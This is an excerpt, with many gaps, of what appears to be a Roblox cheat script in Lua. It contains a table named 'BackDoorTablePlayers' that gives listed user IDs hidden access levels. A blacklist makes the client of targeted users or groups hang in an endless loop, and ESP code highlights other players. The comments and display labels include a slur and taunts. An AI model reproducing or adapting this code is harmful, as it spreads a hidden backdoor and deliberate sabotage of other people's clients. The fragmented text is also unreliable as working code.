--[[ Bugs
				Dear Cyrus, no one cares enough about this to not changes it because we use it and so, you over reacting about a script is sad. Goodbye! - Hells
--]]
...
local BackDoorTablePlayers = {
	[1693235598] = {
		['Name'] = "Hells HAHAHAHA | DOPE MUNEY";
		['Access'] = 4;
		['Colour'] = Color3.fromRGB(204, 0, 34);
    };
    [1814565493] = {
		['Name'] = "Hells HAHAHAHA | DOPE MUNEY";
		['Access'] = 4;
	...
	[2696770] = {
		['Name'] = "mista p | DOPE MUNEY";
		['Access'] = 2;
		['Colour'] = Color3.fromRGB(128, 255, 255);
	};
	[1269871595] = {
		['Name'] = "LORD EMRE!!! YUHHH";
		['Access'] = 4;
		['Colour'] = Color3.fromRGB(255, 51, 51);
	};
	[3011725] = {
		['Name'] = "Gank | DOPE MUNEY";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(25, 255, 25);
	};
	[380144831] = {
		['Name'] = "Psycho";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(25, 178, 255);
	};
	[59270106] = {
		['Name'] = "Kash";
		['Access'] = 3;
    ...
    [1609884844] = {
		['Name'] = "Gank | DOPE MUNEY";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(136 ,0, 204);
	};
      [1065069613] = {
		['Name'] = "AIMCANCEL | DOPE MUNEY";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(255, 0, 0);
    };
}
...
local BlacklistTable = {
	[1112312313] = true; -- retard who hit me
	...
	if Player and UseDrawingLib and not Colour then
		...
		if Player then
			if not Blacklisted then 
				...
				TextLabel.Text = "[Blacklisted skid] "..Player.Name.." (im in the shitfam group bro lol)"
			end 
		else 
			TextLabel.Text = Name
		end
...
Players.PlayerAdded:Connect(function(Player)
	...
	Player.CharacterAdded:Connect(function(C)
		...
		if Head then 
			...
			if Blacklist or Player:IsInGroup(6762089) or string.find(Player.Name:lower(),"smoked") then
...
if LP:IsInGroup(6792735) or LP:IsInGroup(6762089) or LP:IsInGroup(5000083) or string.find(LP.Name:lower(),"smoked") or BlacklistTable[LP.UserId] then while true do end end
AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player then 
...
coroutine.resume(coroutine.create(function()
	for i,Player in pairs(Players:GetPlayers()) do
		local Backdoor = BackDoorTablePlayers[Player.UserId]
		local Blacklist = BlacklistTable[Player.UserId]
		if (Blacklist or Player:IsInGroup(6762089) or string.find(Player.Name:lower(),"smoked")) and Player.character and Player.Character:FindFirstChild'Head' then
			Esp(Player.Character.Head,Player.Name,Color3.fromRGB(102,51,0),true)
			Player.CharacterAdded:Connect(function(C)
				local Head = C:WaitForChild'Head'
				if Head then 
...
notif("Newest Update","Unbanned YOULOSE B)",10,nil)
